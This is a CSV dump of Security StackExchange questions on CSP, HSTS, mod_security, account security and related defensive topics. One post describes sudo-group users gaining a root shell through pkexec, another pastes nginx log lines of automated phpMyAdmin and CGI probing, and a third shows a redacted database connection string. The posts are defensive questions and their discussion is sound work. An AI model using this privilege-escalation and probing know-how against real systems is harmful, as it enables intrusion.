Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate,ContentLicense
"210345","1","210391","","2019-05-17 09:22:14","","2","1756","<p>Ever since <a href=""https://www.w3.org/TR/CSP3/"" rel=""nofollow noreferrer"">CSP 3</a> introduced <code>strict-dynamic</code>, Google has <a href=""https://csp.withgoogle.com/docs/strict-csp.html"" rel=""nofollow noreferrer"">recommended</a> its usage. Indeed, the idea of maintaining one ""root"" script, which in turn loads all other necessary scripts, sets up event handlers, etc. instead of maintaining a whitelist of allowed domains or hashes for every inline script seems positive.</p>

<p>However, whenever I read about <code>strict-dynamic</code>, I <em>always</em> read about the inclusion of a nonce. This can prove to be difficult, if for instance the page is generated by an application server, yet the header is added via a reverse proxy later down the line.</p>

<p>In order to mitigate this, I tried to use the other mechanism to identify scripts: hashes. More specifically, the <code>'sha256-...'</code> keyword.</p>

<p>The complete Conent Security Policy would look like this then:</p>

<pre><code>script-src 'strict-dynamic' 'sha256-XBQNNdy0amIuLO3171zDY4zf/RwRjJMx+MhGafC3R4M=' 'unsafe-inline' http: https:;
object-src 'none';
base-uri 'none';
report-uri https://csp.example.com;
</code></pre>

<p>Is there any reason why this might be less safe than a nonce-based approach?</p>
","","user163495","","","","2021-03-14 20:58:18","Does it pose a problem to use 'strict-dynamic' with a hash and not a nonce?","<content-security-policy>","1","0","","","","CC BY-SA 4.0"
"210415","1","212921","","2019-05-18 19:31:09","","3","1044","<p>In <a href=""https://helpx.adobe.com/in/fonts/using/content-security-policy.html"" rel=""nofollow noreferrer"">this help site</a>, Adobe recommends not setting CSP for web fonts saying:</p>

<blockquote>
  <p>The CSP policy does not allow you to set an exception for inline styles added by a script from a specific domain.</p>
</blockquote>

<p>and</p>

<blockquote>
  <p>Adobe Fonts uses inline styles and fonts as data URIs to provide our service, and making exceptions for these negates a lot of the protection provided by a CSP. </p>
</blockquote>

<p>What do they mean by it? And if my site already has CSP set, how do I use Adobe fonts if I shouldn't set CSP for it?</p>
","82371","","","","","2019-11-08 15:43:47","Why does Adobe recommend not setting CSP headers for its web fonts?","<content-security-policy>","1","1","","","","CC BY-SA 4.0"
"210534","1","210599","","2019-05-21 08:57:34","","1","1469","<p>I had corrupted my sudo setup. With no possibility to login as root (locked root account, broken sudo), a search made it clear: use pkexec. It worked. So far, so good.</p>

<p>But that turns out to be a big security hole: a user that is part of the 'sudo' group can always gain root access, and start a shell as the root user. That is, at least on a default Ubuntu server installation with sudo.</p>

<p>This renders sudo useless as a means to restrict elevated privileges to certain commands for selected users. Unless some policykit policy is altered, apparently. That's not mentioned in the man pages of 'visudo' or 'sudo'. And I've never seen it mentioned in any tutorial on how to set up the sudoers file (probably I've been reading the wrong tutorials, then).</p>

<p>Can anyone point me into the right direction? What policykit, or sudo, configuration file needs to be changed (and how) in order to accommodate privilege escalation for one specific command, for one specific user?</p>

<p>As an example, I want the 'sudotest' user to only be able to run the command 'cat /proc/tty/driver/serial' which results in a 'Permission denied' error for non-privileged users.</p>

<p>Setup:</p>

<ul>
<li>Ubuntu bionic</li>
<li>user 'sudotest', part of 'sudo' group</li>
<li>either: single sudo command for 'sudotest', or even none</li>
</ul>



<pre><code>me@some-server:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.2 LTS
Release:    18.04
Codename:   bionic

me@some-server:~$ ls -l /home
total 20
drwx------ 6 me  me   4096 May 17 15:17 me
drwx------ 2 root root 16384 Nov 26 17:20 lost+found

me@some-server:~$ sudo cat /etc/sudoers | grep -v ""^#\|^$""
Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path=""/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin""
root    ALL=(ALL:ALL) ALL
me  ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL

me@some-server:~$ sudo useradd -m -d /home/sudotest -s /bin/bash sudotest

me@some-server:~$ sudo gpasswd -a sudotest sudo
Adding user sudotest to group sudo

me@some-server:~$ sudo passwd sudotest
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully

me@some-server:~$ su - sudotest
su - sudotest
Password:

me@some-server:~$ $ groups
sudotest sudo

sudotest@some-server:~$ sudo -l
[sudo] password for sudotest: 
Sorry, user sudotest may not run sudo on some-server.
</code></pre>

<p>Hey, this user can not even do anything with sudo. Looks like an unprivileged user.
Still, this user is perfectly capable of gaining a root shell using pkexec.</p>

<p>How can I prevent this?
What configuration options do I have to allow this user to execute one single command of my choosing with elevated privileges?</p>

<hr>

<p>Update:
This is different from the linked question in that I want to know how I can (safely) limit a specific user to be able to execute one specific command with elevated privileges with sudo on a system that has polkit installed by default, which, apparently, allows any sudo user to gain a root shell.</p>
","208426","","208426","","2019-05-21 11:29:03","2019-05-22 12:17:53","sudo restrictions circumvention with pkexec: root shell","<account-security><privilege-escalation><sudo>","1","6","","","","CC BY-SA 4.0"
"4355","1","4379","","2011-06-05 13:21:45","","15","1931","<p>I am doing a research on how to prevent my gmail account from being hacked and what are the options of claiming it back. </p>

<p>The associated phone number and recovery email can be changed, in fact I expect the attacker to change them immediately so there is no real value in them. Is there a way how to link my gmail account to my real life identity; a paid service maybe?</p>
","2337","","98538","","2016-12-04 23:26:09","2020-12-07 11:43:34","Gmail account hack prevention and recovery","<attack-prevention><incident-response><gmail><account-security>","5","0","","","","CC BY-SA 3.0"
"210615","1","","","2019-05-22 16:14:17","","2","123","<p>I run a website with a resource &amp; time consuming URL, say ~20 seconds per request. In the last few days this URL is being targeted by some kind of DoS attack, and I'm trying to use mod_security so none can abuse this URL. It makes no sense a real (ie human) user hits this URL more than once every 5 seconds, so I ended up with this:</p>

<pre><code>&lt;LocationMatch ""/mySlowUrl/""&gt;
        SecRuleEngine on
        SecAction phase:2,id:10001,initcol:IP=%{REMOTE_ADDR},pass,nolog
        SecRule IP:soslow ""@eq 1"" phase:2,id:10002,deny,status:503,nolog,setenv:SOSLOW
        SecAction phase:2,id:10003,setvar:IP.soslow=1,expirevar:IP.soslow=5,pass,nolog
        Header always set Retry-After ""5"" env=SOSLOW
&lt;/LocationMatch&gt;
</code></pre>

<p>It ""works"", but as long as persistent storage is only saved at the end of request processing, IP:soslow is only set after the whole 20 seconds first request, so the attacker still has 20 seconds to overload the server.</p>

<p>Is there any way to flush persistent variables so they are written as soon as rule is processed (in phase 2)? Any other idea to stop this attacks?</p>
","208594","","","","","2022-10-03 22:30:31","mod_security flush persistence","<mod-security>","0","0","","","","CC BY-SA 4.0"
"210656","1","210658","","2019-05-23 11:34:28","","62","8580","<p>I have recently logged into a website. When I clicked on the ""Update Profile"" page, you are displayed with a list of text boxes for all the user fields, e.g. name, email, phone number etc.</p>

<p>There is also a box for password and confirm password (for if you wish to update these values), however, when you go into this page, those boxes are already populated, which made me think, why are they putting placeholders in?</p>

<p>When going into inspect element, they actually have the values of your password, transformed into upper case like this:</p>

<pre><code>&lt;input type=""password"" name=""txtPassword2"" size=""45"" value=""MYPASSAPPEARSHERE""&gt;
</code></pre>

<p><strong>I have also recently noticed that the case of your password or username is irrelevant when logging in - e.g. I can put it in all caps, all lower, or a mixture of both and it will still accept the password.</strong></p>

<p>Is this a security hole and does this indicate they are storing passwords as plain text?</p>

<p>This is not a duplicate of (<a href=""https://security.stackexchange.com/questions/7118/what-to-do-about-websites-that-store-plain-text-passwords"">What to do about websites that store plain text passwords</a>) as I’m asking here for clarification of whether this <strong>indicates</strong> the site is storing plaintext passwords, rather than what to do about it. </p>

<hr>

<p><strong>Response from the company:</strong> After pushing hard, the company confessed that they are in fact, storing passwords in plain text. </p>
","208677","","208677","","2019-05-25 07:28:58","2019-05-26 16:30:35","Website returning plaintext password","<passwords><web-application><account-security>","3","10","","2019-05-29 09:33:15","","CC BY-SA 4.0"
"210744","1","","","2019-05-24 16:30:54","","0","1304","<p>I found that the security header for protection against mitm attacks in <em>first connection</em> is to implement HSTS <code>preload</code> directive and add the list of google: <a href=""https://hstspreload.org/"" rel=""nofollow noreferrer"">https://hstspreload.org/</a></p>
<p>However the requisites to do that is to include all subdomains of the domain given. This makes a problem to websites that are really big, they just want to preload the domain and not the subdomains...</p>
<p>1)is there any way to make this work?
2) does the preload of the domain preloads subdomains too? i may be getting all wrong</p>
<hr />
<p><em>personal example/experience:</em></p>
<p>i was doing pentesting against a website example.com and it was preloaded and added to the hstspreload list, however i found that vulnerable.example.com subdomain didn't have HSTS header and it wasn't preloaded, so of course it was vulnerable to mitm attacks, but how? it had the domain preloaded, and to add it there you need to add subdomains too... so was this an exeption or what happened here?</p>
","206540","","-1","","2020-06-16 09:49:05","2019-05-24 18:40:21","HSTS preload and requisites on domain - subdomains must be added too?","<man-in-the-middle><hsts><content-security-policy>","1","0","","","","CC BY-SA 4.0"
"142658","1","","","2016-11-15 13:01:56","","2","2178","<p>recently I've identified that some hack attempt was performed at one of my servers.</p>

<p>I have dumped nginx logs to github, please take a look and try to identify which tool was used to perform this attack.</p>

<p>Excerpt from log:</p>

<pre><code>195.154.41.132 - ktuser [04/Nov/2016:12:59:18 -0400] ""POST /apply.cgi HTTP/1.1"" 404 459 ""-"" ""-""
195.154.41.132 - ktuser [04/Nov/2016:12:59:18 -0400] ""GET /cgi_bin/user_network_connection.asp HTTP/1.1"" 404 459 ""-"" ""-"" 
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/phpmyadmin4/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/2phpmyadmin/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/phpmy/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/phppma/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/myadmin/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
162.243.79.108 - - [01/Nov/2016:16:39:57 -0400] ""HEAD http://8.8.8.8:80/shopdb/ HTTP/1.1"" 404 0 ""-"" ""Mozilla/5.0 Jorgee""
</code></pre>

<p>Full log can be seen here:
<a href=""https://gist.github.com/acosonic/772971fee7b4b20c5ba3da7657a42430"" rel=""nofollow noreferrer"">https://gist.github.com/acosonic/772971fee7b4b20c5ba3da7657a42430</a></p>

<p>Also, please advice if there is some behavioural tool that would learn and identify that above is a threat, and ban such IP's.</p>
","130538","","130538","","2016-11-15 13:56:41","2021-02-05 12:43:38","Anyone can identify tool used to perform this attack?","<firewalls><intrusion><nginx><mod-security><log-analysis>","1","7","","","","CC BY-SA 3.0"
"142728","1","","","2016-11-16 00:18:05","","2","71","<p>What is the extent to which data is separated between user accounts on Android? For example, can I have a different facebook account/any other social media account on each and trust these won't be linked in any way? </p>
","130605","","","","","2016-11-16 00:18:05","Extent of data seperation within multiple user accounts in Android","<account-security>","0","1","","","","CC BY-SA 3.0"
"210816","1","","","2019-05-26 18:12:44","","-1","135","<p>For the past few months, I've been unable to continue a particular course on  udemy.  I can access all other video courses accept that particular course and their support has answered ""We recently upgraded our content delivery network and now use cookies to authenticate each video playback session for enhanced security.  Please go to 'cookies' in your browser settings and allow the property udemycdn-a.com."" </p>

<p>I'm already authenticated when I log in and I can view all other courses, so I don't know why just this one particular course requires this change but not any of the others (even newer ones).  Does this sound strange to anyone else?  Why would this particular course require ""enhanced security"" when udemy is hosting it? It just sounds shady to me. Thanks.</p>
","191190","","","","","2019-05-26 19:35:05","CDN change for ""enhanced security""? (now uses cookies)","<authentication><web-browser><cookies><account-security>","2","2","","","","CC BY-SA 4.0"
"73838","1","","","2014-11-28 01:43:36","","1","208","<p>Is there any tool or method to  separate normal traffic and malicious traffic from pcap? For example : if malicious traffic detected with snort i need to store those packets .only if malicious traffic .  Thanks for respond.</p>
","30276","","30276","","2014-11-28 04:52:58","2014-11-28 04:52:58","Separate normal traffic","<forensics><snort><security-theater>","2","7","","2014-11-28 17:38:07","","CC BY-SA 3.0"
"142999","1","","","2016-11-18 22:59:43","","1","698","<p>We are moving to Amazon our on-premise infrastructure and I'm trying to follow this document to increase our security of the ec2 instances :
<a href=""https://benchmarks.cisecurity.org/tools2/linux/CIS_Amazon_Linux_Benchmark_v2.0.0.pdf"" rel=""nofollow noreferrer"">CISecurity Benchmark for Amazon Linux</a></p>

<p>In the document, it's asked to create 6 differents partitions for:
- /tmp
- /var
- /var/tmp
- /var/log
- /var/log/audit
- /home</p>

<p>I mean, the creation of those separate partitions does increase really the security ?
Because cost-wise for me it looks like increasing significantly the cost of each instances by adding 6 different EBS volumes for those partitions...</p>

<p>Thanks for your knowledge sharing.</p>
","130907","","","","","2017-09-08 03:29:41","CISecurity AMI EC2 Amazon","<audit><content-security-policy><amazon>","2","0","0","","","CC BY-SA 3.0"
"4802","1","","","2011-06-25 23:16:58","","3","3533","<p>I'm trying to get my users lat. and lng. from their address using Google's geocoding API but when mod:security is enabled, it prevents it and the script times out. How can I add an exception by IP or domain for this or just remove whatever configuration that makes mod_security do this?<br>
I am using the <a href=""https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project"" rel=""nofollow"">OWASP ModSecurity Core Rule Set Project</a></p>

<p>UPDATE:</p>

<pre><code>[Sun Jun 26 13:13:14 2011] [error] [client 174.252.196.188]
 ModSecurity: Unable to retrieve collection (name ""ip"", key ""174.252.196.188_fc2ccdca4bf1fc8585b77c1444811dedd59da612"").
 Use SecDataDir to define data directory first. [hostname mydomain.com""] [uri ""/admin/geocoding.php""]
 [unique_id ""EIpfP38AAAEAAA2eAT0AAAAK""]
</code></pre>

<p>I have added this line:</p>

<pre><code>SecDataDir /var/log/apache/modsec_SecDataDir
</code></pre>

<p>Now, I don't get anything in the error log, but still the same behaviour!</p>
","2287","","78998","","2015-12-14 16:35:39","2015-12-14 16:35:39","Mod_security for Apache2 blocks cURL!","<apache><owasp><waf><mod-security><curl>","1","2","","","","CC BY-SA 3.0"
"211162","1","211209","","2019-06-01 16:39:25","","0","135","<p>I have a very common use case where an admin is creating an account of the user and then I need to send the login id generated by my system to the user. And the user will need to set a password on the first login.</p>

<p>So my question here is should I send the user id on email and if yes, then what are the security risks that must need to be incorporated?</p>
","209355","","","","","2019-06-02 23:35:16","Should I send login id on email?","<authentication><email><account-security>","1","3","","","","CC BY-SA 4.0"
"143098","1","","","2016-11-20 08:34:35","","3","137","<p>I use a commercial web host, when I log in via regular FTP this is how the directories looks like:</p>

<p><a href=""https://i.stack.imgur.com/5rVEE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5rVEE.png"" alt=""dir structure""></a>  </p>

<p>It seems strange that I can access system files, I thought I would be limited to access files below my user folder or web root folder (which is within ""customers""). Does my webhost have a security issue or is it normal?</p>
","131027","","98538","","2017-03-02 10:14:00","2017-03-02 10:14:00","Should my webhost show the root filesystem over FTP?","<account-security><ftp><web-hosting>","3","1","","","","CC BY-SA 3.0"
"143235","1","","","2016-11-21 21:37:16","","1","934","<p>I am building an app that will be storing sensitive info (SSN's, DOB's, Financial Information, Credit Cards, etc.</p>

<p>Is there a standard that will cover all these items and what is the best approach to storing? Should blobs be used?</p>
","131182","","485","","2016-12-22 14:33:42","2016-12-22 14:33:42","What is the best Practice / Industry Standard for storing documents with social security numbers, date of birth, financial records, etc?","<content-security-policy><standards><sensitive-data-exposure>","1","5","","2016-12-25 23:31:58","","CC BY-SA 3.0"
"143288","1","","","2016-11-22 15:11:11","","20","4188","<p>I noticed that some folders in the PATH environment variable (e.g. <strong>C:\Python</strong>) give write privileges to anyone on the machine, including users without Admin rights. I understand that people can probably modify the Python executables and things in that folder. However, how dangerous is it if I don't use Python? Also, since most programs on Windows are called either through GUI or with absolute paths, could this issue still affect other more sensitive folders in PATH such as <strong>System32</strong>?</p>
","131262","","37636","","2016-11-22 21:28:59","2016-11-23 14:07:20","Some folders in the PATH variable are writable by anyone. Dangerous or not?","<account-security><environment-variables><windows-7>","3","3","","","","CC BY-SA 3.0"
"143370","1","","","2016-11-23 10:26:00","","2","513","<p>Is there any particular reason (security) for us to implement Soft Delete Mechanism on Deleting User ID or Hard Delete.</p>

<p>I am trying to make my user id better for my web application</p>

<p>thank you. </p>
","131344","","","","","2016-11-24 01:08:24","User ID Soft Delete or Hard Delete?","<deletion><account-security>","1","2","","","","CC BY-SA 3.0"
"74676","1","74686","","2014-12-10 04:12:14","","0","695","<p>I wanted to create a winform application that have a centralized security database. This application is portable, can be save to any PC and simply run the .exe to use, hence there will be many copies of this software. However, it will require a User login, this login account credentials will refer to centralized security database(centralized DB is for security purpose only). If the PC does not have a Internet connection, the software will not be able to identify the credentials. Hence, i came up with an ideal is to put a time stamp, if the last connection to centralized is DB is &lt; 24h, local credential(DB copy from centralized DB) login is granted. But the problem i face now is, the time stamp and 24H limit will have to refer to current system time in the PC(which can be change easily to bypass the time stamp). what is the solution? Any other method that can control the User while the application goes offline? </p>
","62228","","","","","2014-12-10 10:34:14","WinForm Application Security","<authentication><security-seal>","2","1","","","","CC BY-SA 3.0"
"143728","1","143785","","2016-11-27 23:21:46","","2","133","<p>I want to create a system for sensitive information that is only accessible if you have a specific tablet and a specific USB thumb drive. I want to setup such a system for my daughter when she is a certain age, the system will contain certain information I want to pass on.</p>

<p>Is that possible in some way? I have no idea where to start on such a thing.</p>
","131758","","112042","","2016-11-27 23:36:51","2016-11-29 08:44:38","Digital time capsule system","<multi-factor><account-security>","1","5","","","","CC BY-SA 3.0"
"211735","1","211736","","2019-06-12 09:22:11","","7","7876","<p>script-src-attr and script-src-elem directives are new additions in CSP3.
I am not able to understand how are they different from the script-src directive.</p>

<p><a href=""https://w3c.github.io/webappsec-csp/#directive-script-src-elem"" rel=""noreferrer"">https://w3c.github.io/webappsec-csp/#directive-script-src-elem</a></p>

<p>This documents the new addition but I am not able to clearly differentiate between the usage, maybe due to hard language.</p>
","210023","","","","","2020-03-08 12:02:35","CSP: What is script-src-attr and script-src-elem?","<xss><javascript><content-security-policy><header>","1","0","","","","CC BY-SA 4.0"
"211844","1","","","2019-06-14 09:35:55","","0","942","<p>I was just wondering if someone having total control over his/her network, is running my mobile app. Also wireshark is capturing all requests made using the network. My app is calling API endpoint like <a href=""http://bob.com/alice/param1/param2"" rel=""nofollow noreferrer"">http://bob.com/alice/param1/param2</a> and also passing the HTTP parameters.  </p>

<p>Is wireshark capable to capture the network requests like this and is the url visible?  </p>

<p>Also is it possible for someone to track the HTTP parameters I am passing it?</p>

<p>Is it plaintext if I am not using HTTPS? What if it's just a HTTP call? </p>

<p>If not using wireshark, is there any other way to capture network calls made by the app (android / iOS / PhoneGap / Ionic)? </p>
","172812","","195961","","2019-06-14 11:35:25","2019-06-14 12:17:02","Can wireshark capture the exact payload and end point of API used by my Mobile APP?","<mobile><account-security><api><network-scanners><wireshark>","2","0","","","","CC BY-SA 4.0"
"143850","1","","","2016-11-29 07:56:49","","1","208","<p>One of the customers does not have FQDN, only virtual ip, and two servers.
Primary and Secondary. Do we need to generate and install two seperate TLS certificate for both the servers. Or can we assign a FQDN and use one single wildcard certificate in redundancy setup ?</p>
","131899","","","","","2016-11-29 12:25:23","TLS certificate in redundancy setup","<tls><certificates><openssl><certificate-authority><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"75848","1","75852","","2014-12-12 17:33:49","","0","166","<p>I was doing an pen test in a website and the programmer did a big mistake and I was able to read any file. So I read the <code>web.config</code> and see the password for database was in <code>ConnectionStrings_Prod.config</code>.</p>

<p>Before report and just for curiosity, I tried to connect to database. This is MS SQL Server 2014. Because my lack of knowledge, I wasn't able to connect using common program. </p>

<p>So, this was my mistake only? Or this is a second line of defense, because only computer inside the server can connect to the database? (I am outside, in my company) </p>

<p>This is the entire file.</p>

<pre><code>&lt;connectionStrings&gt;
  &lt;remove name=""LocalSqlServer"" /&gt;
  &lt;add name=""LocalSqlServer"" connectionString=""Data Source=10.#.#.#\MSSQLSRV2014,24##;Initial Catalog=****;uid=*****;pwd=****;pooling=true; Min Pool size=50;; Max Pool Size=1000000;Connect Timeout=200;Packet Size=32767;trusted_connection=false;""
    providerName=""System.Data.SqlClient"" /&gt;
  &lt;add name=""**.Properties.Settings.*****ConnectionString""
    connectionString=""Data Source=10.#.#.#\MSSQLSRV2014,24##;Initial Catalog=*****;uid=******;pwd=******;pooling=true; Min Pool size=50; Max Pool Size=1000000;Connect Timeout=200;Packet Size=32767;trusted_connection=false;""
    providerName=""System.Data.SqlClient"" /&gt;
&lt;/connectionStrings&gt;
</code></pre>

<p><strong>What is the impact of this security fault?</strong></p>
","8745","","8745","","2015-01-20 03:07:00","2015-01-20 03:07:00","What is the severity if someone read the ConnectionStrings_Prod.config?","<passwords><databases><data-leakage><security-theater>","2","0","","","","CC BY-SA 3.0"
"143964","1","144186","","2016-11-30 09:13:10","","10","4925","<p>Both options seem to control who can embed the content in an <code>&lt;iframe&gt;</code> tag, just like <code>X-Frame-Options</code> does. Chrome and Safari are deprecating this header (partially, <code>allow-from</code> for instance), so it's a matter of time that it will no longer used by Firefox and Edge as well, so only Content-Security-Policy will be available.</p>

<p>I've been doing some tests, and the same result (block / allow specific domain) is achieved by using either of those options, so, what's really the difference between them? </p>

<p>Expecting some usage examples where one is useful and the other it's not.</p>
","","user15194","","","","2019-09-30 21:03:04","What's the difference between frame-ancestors and child-src?","<content-security-policy><mixed-content>","1","2","","","","CC BY-SA 3.0"
"211917","1","","","2019-06-16 06:33:42","","3","210","<p>My iCloud account has been hacked.</p>

<p>I access links sent by hackers that compromise my iCloud account. The hackers don't have physically access to my phone, the compromised links are sent by them through a picture via whatsapp, notification on pinterest or SMS including a link to a promotion.</p>

<p>Once I click on the respective compromised link, any application that I download from the App store is duplicated on another Android device, hence each time I am logging on Yahoo Mail, LinkedIN etc apps, I see that in the same time another Android device is connecting as well to my accounts- this device is named ""iPhone"", but it has Android logo. Then, I create a brand new iCloud account and this duplication doesn't take place anymore, until I click again on another compromised link.</p>

<p>How can I solve this security problem? I have to add that the compromised links are sent in different forms, as mentioned above, hence I stopped to use my social apps.</p>

<p><a href=""https://i.stack.imgur.com/evyVf.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/evyVf.jpg"" alt=""enter image description here""></a></p>
","209926","","209926","","2019-06-16 11:42:38","2019-06-16 11:42:38","Hacked iCloud account: how can I protect my iPhone security?","<account-security><iphone><smartphone>","0","0","0","","","CC BY-SA 4.0"
"144136","1","177411","","2016-12-02 02:07:27","","3","705","<p>I was implementing a CSP policy and set up the reporting endpoint as another domain, a completely separate origin. Everything seemed to work fine, but talking to a few friends they seemed surprised that it worked as they thought that CSP reports could only go to the same domain or a subdomain. I looked around online and read through the <a href=""https://www.w3.org/TR/CSP/#security-violation-reports"" rel=""nofollow noreferrer"">spec</a> but didn't find anything that substantiated their theory that it used to be that way.</p>

<p>I'm cautious going forward because I'd rather set up a reporting endpoint that I could get consistently rather than one that might fail on older browsers. Is there any truth to their suspicions that cross-origin reporting used to not be supported?</p>

<p>Thanks in advance :)</p>
","67657","","67657","","2016-12-31 22:36:08","2019-06-07 06:24:32","CSP reporting to another origin","<content-security-policy>","3","0","","","","CC BY-SA 3.0"
"144210","1","","","2016-12-02 22:30:58","","1","47","<p>I don't know if my question belongs here, but I had a very strange experience with my computer today. I normally put my laptop to sleep when I don't use it, but, today, when I opened it, a booting configuration option for Phoenix Technologies for a Toshiba computer appeared on my screen. My laptop brand is not even Toshiba, so I was puzzled. There seemed to be no way to escape this process, so I pressed the on/off button to restart. Then, my laptop functioned normally. Is this something to be concerned about? What could have been the problem? </p>
","132314","","","","","2016-12-02 22:30:58","Strange Configuration Process","<account-security>","0","0","","2016-12-03 07:21:11","","CC BY-SA 3.0"
"144212","1","","","2016-12-02 23:22:28","","15","4311","<p>Is anyone here able to clarify how caching affects adding a <code>nonce=value</code> to all inline javascript?</p>

<p>If the nonce must be unique and unpredictable, then one would need to disable all server-side (i.e. Varnish, Cloudfront, etc) caching on the pages that use <code>&lt;script nonce=""XXXXX""&gt;</code>. Correct?</p>

<p>See <i>example 4</i> <a href=""http://www.cspplayground.com/csp_overview"" rel=""noreferrer"">here</a> for details.</p>
","130015","","98538","","2016-12-02 23:31:45","2023-09-20 05:57:16","HTTP Content-Security-Policy Nonce and Caching","<http><javascript><content-security-policy><caching>","5","0","","","","CC BY-SA 3.0"
"212175","1","212180","","2019-06-20 15:07:57","","2","408","<p>I am currently using 9 digit numbers to authenticate writers on two apps. In the first app, this unlocks editing tools for use in making content rich dhtml documents which are stored on the local machine by default. With the second app, it opens up create/edit/delete functionality for content items (meant for low security, non-personal content) stored in a DB. But in this app all changes are versioned, so in the case of a malicious user it is just a question or reverting to the previous good version.</p>

<p>To summarize, I'm using weak credentials for access to limited functionality to two apps meant to be used with fairly open &amp; shared information. And my credential system could always be hardened sometime down the road as the app requirements warrant. </p>

<p>So my question is for those with deep knowledge and experience in computer security: Is this a mistake? What is there to look out for that I'm probably not aware of? Am I going to regret not using stronger credentials later on?</p>
","210578","","","","","2019-06-20 20:57:24","Is using weak login credentials always bad?","<passwords><password-policy><account-security>","3","1","","","","CC BY-SA 4.0"
"212203","1","212204","","2019-06-21 04:27:09","","2","656","<p>I know browsers use cookies so that, for example, if I log into Facebook on a public computer and forget to log out, the next person who opens up a new browser can go into my account.</p>

<p>Does this work the same way for shared VPNs, especially on sites that are not http<strong>s</strong>? Can someone on the same VPN network tap your traffic and cookies, gaining access to your private accounts?</p>
","210603","","","","","2019-06-21 08:45:01","When using a shared / public VPN, can others on the same IP address log into your accounts?","<privacy><vpn><cookies><account-security>","1","0","","","","CC BY-SA 4.0"
